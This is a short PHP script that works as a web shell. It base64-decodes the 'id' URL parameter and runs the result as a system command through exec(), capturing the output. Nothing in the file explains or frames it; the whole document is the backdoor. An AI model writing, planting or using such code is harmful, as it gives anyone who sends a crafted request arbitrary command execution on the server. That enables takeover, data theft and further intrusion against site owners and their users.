<?php
    $decoded_command = base64_decode($_GET['id']);
    exec($decoded_command . " 2>&1", $output, $return_status);
?>

